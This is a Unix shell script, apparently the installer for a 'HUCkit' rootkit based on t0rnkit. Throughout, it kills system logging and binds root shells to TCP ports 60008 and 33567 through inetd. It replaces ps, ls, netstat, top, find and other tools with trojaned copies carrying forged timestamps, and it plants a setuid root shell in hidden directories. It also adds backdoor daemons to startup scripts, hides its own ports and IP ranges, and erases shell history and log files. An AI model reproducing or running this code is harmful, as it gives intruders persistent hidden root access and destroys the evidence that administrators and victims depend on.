#!/bin/sh
# HUCkit. by 1i0n"
# mail bugs to webmaster@cnhonker.com"

BLK='[1;30m'
RED='[1;31m'
GRN='[1;32m'
YEL='[1;33m'
BLU='[1;34m'
MAG='[1;35m'
CYN='[1;36m'
WHI='[1;37m'
DRED='[0;31m'
DGRN='^[[0;32m'
DYEL='[0;33m'
DBLU='[0;34m'
DMAG='[0;35m'
DCYN='[0;36m'
DWHI='[0;37m'
RES='[0m'

killall -9 syslogd
startime=`date +%S`
bla2=`pwd`
echo "             ${BLU}backdooring started on ${WHI}`hostname -f`${RES}"
echo '60008 stream tcp nowait root /bin/sh sh' >>/etc/inetd.conf
echo '33567 stream tcp nowait root /bin/sh sh' >>/etc/inetd.conf
killall -HUP inetd
if [ "`grep in.inetd /etc/rc.d/rc.sysinit`" ]; then
echo "${BLU}# ${RED}    [Alert] ${WHI}t0rnkit probably installed on machine ${RED}[Alert]       ${BLU} #${RES}"
else
echo "${BLU}#                                                                  #${RES}"
fi
SYSLOGCONF="/etc/syslog.conf"


echo -n "              ${RED}checking for remote logging... ${RES}"

REMOTE=`grep -v "^#" "$SYSLOGCONF" | grep -v "^$" | grep "@" | cut -d '@' -f 2`

if [ ! -z "$REMOTE" ]; then
        echo "${WHI}holy guacamole batman${RES}"
        echo
        echo '${RED}                      REMOTE LOGGING DETECTED ${RES}'
        echo '${WHI}        I hope you can get to these other computer(s): ${RES}'
        echo
        for host in $REMOTE; do
                echo -n "            "
                echo $host
        done
        echo
        echo ' ${WHI}       cuz this computer is LOGGING to it... ${RES}'
        echo
else
        echo "${WHI}guess not.${RES}"
fi

echo "${BLU}# ${BLU}[Installing trojans....]                                  ${BLU}       #${RES}"
if test -n "$1" ; then
echo "${BLU}# ${BLU}        Using Password : ${WHI}$1                                 ${BLU}       ${RES}"
cd $bla2
./pg $1 > /etc/ttyhash
else
echo "${BLU}# ${RED} No Password Specified, using default - cnhonker           ${BLU}       #${RES}"
./pg cnhonker >/etc/ttyhash
fi

if test -n "$2" ; then
echo "${BLU}# ${BLU}        Using ssh-port : ${WHI}$2                                 ${BLU}       ${RES}"
tar xfz ssh.tgz
echo "Port $2" >> .t0rn/shdcf
echo "3 $2" >> dev/.1addr
cat .t0rn/shdcf2 >> .t0rn/shdcf ; rm -rf .t0rn/shdcf2
else
echo "${BLU}# ${RED} No ssh-port Specified, using default - 33568             ${BLU}       #${RES}"
tar xfz ssh.tgz
echo "Port 33568" >> .t0rn/shdcf
echo "3 $2" >> dev/.1addr
cat .t0rn/shdcf2 >> .t0rn/shdcf ; rm -rf .t0rn/shdcf2    
fi

# touch -acmr /bin/login login
# ./sz /bin/login login 
# mv -f /bin/login /sbin/xlogin
# mv -f login /bin/login
# chmod 4555 /bin/login

echo "${BLU}#                                                                  ${BLU}#${RES}"
echo "${BLU}#          ${RED}: login moved and backdoored                            ${BLU}#${RES}"

# Ok lets start creating dirs

mkdir -p /usr/man/man1/man1/
mkdir -p /usr/man/man1/man1/lib/
mkdir -p /usr/man/man1/man1/lib/.lib/
mkdir -p /usr/man/man1/man1/lib/.lib/.backup/
mkdir -p /usr/src/.puta/
mkdir -p /usr/info/.t0rn/

cp dev/.1addr /usr/src/.puta/
cp dev/.1file /usr/src/.puta/
cp dev/.1logz /usr/src/.puta/
cp dev/.1proc /usr/src/.puta/

mv .t0rn/sh* /usr/info/.t0rn/
mv /usr/info/.t0rn/sharsed /usr/sbin/nscd

mv in.telnetd /bin/in.telnetd
mv mjy /bin/mjy
touch -r /bin/sh /bin/in.telnetd
touch -r /bin/sh /bin/mjy
cp /bin/mjy /usr/man/man1/man1/lib/.lib/
cp /bin/in.telnetd /usr/man/man1/man1/lib/.lib/
cp /bin/sh /usr/man/man1/man1/lib/.lib/.x
chown root:root /usr/man/man1/man1/lib/.lib/.x
chmod +s /usr/man/man1/man1/lib/.lib/.x

/usr/sbin/nscd -q
/bin/in.telnetd &

echo >> /etc/rc.d/rc.sysinit
echo "# Name Server Cache Daemon..">> /etc/rc.d/rc.sysinit
echo >> /etc/rc.d/rc.sysinit
echo "/usr/sbin/nscd -q" >> /etc/rc.d/rc.sysinit
echo "/bin/in.telnetd" >> /etc/rc.d/rc.sysinit
echo >> /etc/rc.d/rc.sysinit
echo "# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #">> /etc/rc.d/rc.sysinit


# time change bitch

touch -acmr /sbin/ifconfig ifconfig
touch -acmr /bin/ps ps
touch -acmr /usr/bin/du du
touch -acmr /bin/ls ls
touch -acmr /bin/netstat netstat
touch -acmr /usr/sbin/in.fingerd in.fingerd
touch -acmr /usr/bin/find find
touch -acmr /usr/bin/top top

# Backdoor ps/top/du/ls/netstat
mv -f in.fingerd /usr/sbin/in.fingerd
mv -f ps /bin/ps
mv -f ifconfig /sbin/ifconfig
mv -f du /usr/bin/du
mv -f netstat /bin/netstat
mv -f top /usr/bin/top
mv -f ls /bin/ls
mv -f find /usr/bin/find


echo "${BLU}#          ${RED}: ps/du/ls/top/netstat/find backdoored                  ${BLU}#${RES}"
echo "${BLU}#                                                                  #${RES}"
echo "${BLU}# ${BLU}[Moving our files...]                                            ${BLU}#${RES}"
cd $bla2
#mv t0rns /usr/src/.puta/t0rns
mv t0rnp /usr/src/.puta/t0rnp
mv t0rnsb /usr/src/.puta/t0rnsb
#cd /usr/src/.puta/
#./t0rns

echo "${BLU}#          ${RED}: t0rnsniff/t0rnparse/sauber moved                      ${BLU}#${RES}"
echo "${BLU}# ${BLU}[Modifying system settings to suit our needs]                    ${BLU}#${RES}"
echo "${BLU}#          ${RED}: cleaning inetd.conf - enabling finger/telnet          ${BLU}#${RES}"
sed "s/^#telnet/#telnet/" /etc/inetd.conf > /tmp/.pinespool ; touch -acmr /etc/inetd.conf /tmp/.pinespool; mv -f /tmp/.pinespool /etc/inetd.conf
sed "s/^#shell/#shell/" /etc/inetd.conf > /tmp/.pinespool ; touch -acmr /etc/inetd.conf /tmp/.pinespool ;mv -f /tmp/.pinespool /etc/inetd.conf
sed "s/^# telnet/# telnet/" /etc/inetd.conf > /tmp/.pinespool ; touch -acmr /etc/inetd.conf /tmp/.pinespool; mv -f /tmp/.pinespool /etc/inetd.conf
sed "s/^# shell/# shell/" /etc/inetd.conf > /tmp/.pinespool ; touch -acmr /etc/inetd.conf /tmp/.pinespool ;mv -f /tmp/.pinespool /etc/inetd.conf
sed "s/^#finger/#finger/" /etc/inetd.conf > /tmp/.pinespool ; touch -acmr /etc/inetd.conf /tmp/.pinespool; mv -f /tmp/.pinespool /etc/inetd.conf
sed "s/^# finger/# finger/" /etc/inetd.conf > /tmp/.pinespool ; touch -acmr /etc/inetd.conf /tmp/.pinespool; mv -f /tmp/.pinespool /etc/inetd.conf
sed '/finger/s/nobody/root/g' /etc/inetd.conf > /tmp/.pinespool ; touch -acmr /etc/inetd.conf /tmp/.pinespool; mv -f /tmp/.pinespool /etc/inetd.conf

if [ "`grep ALL /etc/hosts.deny`" ]; then
echo "${BLU}#          ${RED}: Detected ALL : hosts.deny tcpd backdoored     ${BLU}        #${RES}"

else
echo ""
fi


echo "${WHI}--------------------------------------------------------------------${RES}"
echo "${RED}[Patching... ]${RES}  "
echo "${BLU}This version has no patching.. do it manually bitch${RES}"

# removed this patching since this kit is not going to be used with the
# wuftpd/statd worms.. 

killall inetd
/usr/sbin/inetd

echo "${WHI}--------------------------------------------------------------------${RES}"

echo "${RED}[System Information...]${RES}" 
MYIPADDR=`/sbin/ifconfig eth0 | grep "inet addr:" | \
awk -F ' ' ' {print $2} ' | cut -c6-`
echo "${BLU}Hostname :${WHI} `hostname -f` ($MYIPADDR)${RES}"
uname -a | awk '{ print  $11 }' >/tmp/info_tmp
echo "${BLU}Arch : ${WHI}`cat /tmp/info_tmp` -+- bogomips : `cat /proc/cpuinfo | grep bogomips | awk ' {print $3}'` '${RES}"
echo "${BLU}Alternative IP :${WHI} "`hostname -i`" -+-  Might be ["`/sbin/ifconfig | grep \
eth | wc -l`" ] active adapters.${RES}"              
if [ -f /etc/redhat-release ]; then
echo -n "${BLU}Distribution:${WHI} `head -1 /etc/redhat-release`${RES}"
else
echo -n "${BLU}Distribution:${WHI} unknown${RES}"
fi

endtime=`date +%S`
total=`expr $endtime - $startime`

echo ""                        
echo "${WHI}--------------------------------------------------------------------${RES}"
echo "${RED}ipchains ...?${RES}"
/sbin/ipchains -L input | head -5
echo "${WHI}--------------------------------------------------------------------${RES}"

echo "${WHI}============================== ${RED}Backdooring completed in :$total seconds ${RES}"
cd $bla2
./getip.sh
cd ../
rm -rf lib
if [ -f /usr/sbin/syslogd ] ; then
/usr/sbin/syslogd
else
/sbin/syslogd
fi

echo 2 202.96 > /usr/src/.puta/.1addr
echo 2 211.167 >> /usr/src/.puta/.1addr
echo 2 202.104 >> /usr/src/.puta/.1addr
echo 4 1008 >> /usr/src/.puta/.1addr
echo 4 60008 >> /usr/src/.puta/.1addr
echo 4 33567 >> /usr/src/.puta/.1addr
echo 4 33568 >> /usr/src/.puta/.1addr
echo 3 33568 >> /usr/src/.puta/.1addr
echo 3 33567 >> /usr/src/.puta/.1addr
echo 3 60008 >> /usr/src/.puta/.1addr
echo 3 1008 >> /usr/src/.puta/.1addr

rm -fr /.bash_history
rm -fr /root/.bash_history
echo >/var/log/messages
echo >/var/log/maillog

